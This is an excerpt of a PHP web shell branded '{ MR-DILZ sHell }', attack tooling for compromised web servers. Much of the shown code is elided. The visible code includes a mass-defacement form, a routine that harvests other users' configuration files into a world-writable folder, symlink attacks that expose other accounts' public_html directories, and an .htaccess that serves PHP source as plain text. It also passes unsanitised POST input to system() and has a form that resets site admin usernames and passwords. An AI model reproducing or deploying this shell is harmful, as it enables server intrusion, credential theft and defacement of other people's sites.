...
/* Configurasi */
$aupas 			= "04b835485c3587fa4a6059aeef9b2a75";//24
...
<html>
	<head>
		...
		<meta name="author" content="Mr-Dilz"/>
		<meta name="copyright" content="{ MR-DILZ }"/>
		<title>{ MR-DILZ sHell }</title>
		<link rel="icon" type="image/png" href="https://image.flaticon.com/icons/png/128/337/337947.png"/>
	...
	<body class="bg-dark text-center text-light">
		...
		<a href="https://facebook.com/fadhilz99" class="text-muted fixed-bottom mb-3">Copyright 2019 @ { MR-DILZ }</a>
	</body>
</html>
<?php
exit;
...
function about(){
	echo '<div class="card text-center bg-light about">
		<h4 class="card-header">{ MR-DILZ }</h4>
		<div class="card-body">
			<center><div class="img"></div></center>
			<p class="card-text">{ MR-DILZ } Dont system is save.</p>
		</div>
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2019 { MR-DILZ }</small>
		</div>
	</div><br/>';
	exit;
}
...
function aksiMasdef($dir,$file,$imgfol,$imgfile){
	...
	if($_POST['start']){
		...
		echo "<form method='post'>
			...
			<textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { MR-DILZ }'></textarea><br/>
...
function aksiConfig($dir,$file){
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("MR-DILZ_config", 0777);
		$isi_htc = "Options allnRequire NonenSatisfy Any";
		$htc = fopen("MR-DILZ_config/.htaccess","w");
		fwrite($htc, $isi_htc);
			...
			if(is_readable($user_config_dir)){
				...
				foreach($grab_config as $config => $nama_config){
					...
					if($ambil_config == ''){
						...
						$file_config = fopen("MR-DILZ_config/$user_con-$nama_config.txt","w");
		...
		<a href='?dir=$dir/MR-DILZ_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
	}else{
		echo "<form method='post'>
				...
				if(eregi("zone",$d0main)){
					...
					if(strlen(trim($domains[1][0])) > 2){
						...
						echo "<tr>
							...
							<td>".$user['name']."</td>
							<td><a href='$full/MR-DILZ_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
						</tr>";
						flush();
						$dcount++;
					}
			...
			<table class='text-center table-responsive'>
				...
				while(!feof($file)){
					...
					echo "<tr>
						<td>".$dcount."</td>
						<td>".$matches."</td>
						<td><a href=$full/MR-DILZ_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
					</tr>";
					$dcount++;
				}
				fclose($file);
...
function aksiSymread($dir,$file){
	...
	<textarea class='form-control' rows='13' name='file'>";
		...
		if ($r3ad){
			...
			if ($sm){
				$r3ad = @fopen('MR-DILZ_sym/sym.txt', 'r');
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
			}
		}
...
function sym404($dir,$file){
	$cp = get_current_user();
	if($_POST['execute']){
		@rmdir("MR-DILZ_sym404");
		@mkdir("MR-DILZ_sym404", 0777);
		$dir = $_POST['dir'];
		$isi = $_POST['isi'];
		@system("ln -s ".$dir."MR-DILZ_sym404/".$isi);
		@symlink($dir,"MR-DILZ_sym404/".$isi);
		$inija = fopen("MR-DILZ_sym404/.htaccess", "w");
		@fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
		echo'<a href="/MR-DILZ_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
	}else{
...
function autoEdit($dir,$file){
	if($_POST['hajar']){
		...
		<form method='post'>
			...
			<h5>Set User & Pass :</h5>
			<input type='text' name='user_baru' value='MR-DILZ' class='form-control mb-3' placeholder='Set Username'>
			<input type='text' name='pass_baru' value='MR-DILZ' class='form-control mb-4' placeholder='Set Password'>
...
<html>
	...
	<body class="bg-dark text-light">
		...
		<style>
			...
			.about .card-body .img{
				position: relative;
				background: url(https://firebasestorage.googleapis.com/v0/b/comptutor-240899.appspot.com/o/depes.png?alt=media&token=2717b27c-0160-4299-9854-3989d4049d38);
		...
		<nav class="navbar static-top navbar-dark">
			...
			<div class="collapse navbar-collapse" id="info">
				<ul>
					<a href="https://facebook.com/MR-DILZOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
					<a href="https://www.instagram.com/MR-DILZ.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
					<a href="https://www.youtube.com/MR-DILZ" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
					<a href="https://github.com/MR-DILZid" class="lain"><i class="fa fa-github tambah"></i></a>
					<a href="https://MR-DILZ.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
				</ul>
			</div>
		</nav>
		<?php
		echo '<div class="container">
			<h1 class="text-center"><a href="https://facebook.com/MR-DILZOfficial" style="color:#ffffff;">{ MR-DILZ }</h1>
...
';
				...
				echo '</table></div><hr/>
				<center><a class="text-muted" href="https://facebook.com/MR-DILZOfficial">Copyright 2019 { MR-DILZ }</a></center><br/>';	
